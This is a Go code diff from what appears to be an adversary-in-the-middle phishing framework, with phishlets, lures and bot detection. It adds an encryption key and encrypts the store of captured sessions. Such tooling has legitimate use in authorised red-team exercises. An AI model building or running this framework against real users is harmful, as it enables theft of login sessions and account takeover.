@@ -13,6 +13,7 @@ import (
 	"github.com/travisbale/mirage/internal/botguard"
 	"github.com/travisbale/mirage/internal/cert"
 	"github.com/travisbale/mirage/internal/config"
+	"github.com/travisbale/mirage/internal/crypto"
 	"github.com/travisbale/mirage/internal/crypto/aes"
 	"github.com/travisbale/mirage/internal/dns"
 	"github.com/travisbale/mirage/internal/events"
@@ -71,6 +72,7 @@ type initializer struct {
 	lureStore        *sqlite.Lures
 	phishletStore    *sqlite.Phishlets
 	zones            map[string]aitm.ZoneConfig
+	encryptionKey    []byte
 	dnsProviders     map[string]aitm.DNSProvider
 	botStore         *sqlite.Bots
 	botGuardSvc      *aitm.BotGuardService
@@ -127,6 +129,13 @@ func (ini *initializer) initStore() error {
 		return fmt.Errorf("opening database: %w", err)
 	}
 	ini.db = db
+
+	keyPath := filepath.Join(ini.cfg.DataDir, "encryption.key")
+	key, err := crypto.LoadOrGenerateKey(keyPath)
+	if err != nil {
+		return fmt.Errorf("loading encryption key: %w", err)
+	}
+	ini.encryptionKey = key
 
 	return nil
 }
@@ -224,7 +233,11 @@ func (ini *initializer) initServices() error {
 		return fmt.Errorf("loading bot signatures: %w", err)
 	}
 
-	ini.sessionStore = sqlite.NewSessionStore(ini.db)
+	sessionCipher, err := aes.NewCipher(ini.encryptionKey)
+	if err != nil {
+		return fmt.Errorf("creating session cipher: %w", err)
+	}
+	ini.sessionStore = sqlite.NewSessionStore(ini.db, sessionCipher)
 	ini.sessionSvc = &aitm.SessionService{Store: ini.sessionStore, Bus: ini.bus}
 	ini.blacklistSvc = aitm.NewBlacklistService(ini.bus)
 	ini.spoofer = spoof.NewServer(ini.cfg.SpoofURL, proxy.SessionCookieName, ini.logger)
@@ -244,7 +257,7 @@ func (ini *initializer) initServices() error {
 	}
 	ini.phishletSvc = phishletSvc
 
-	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: phishletSvc, Cipher: aes.Cipher{}}
+	ini.lureSvc = &aitm.LureService{Store: ini.lureStore, Invalidator: phishletSvc, Cipher: aes.KeylessCipher{}}
 	ini.redirectNotifier = redirect.NewNotifier(ini.bus, ini.sessionSvc, ini.lureSvc, ini.logger)
 
 	ini.puppetSvc = ini.initPuppet()
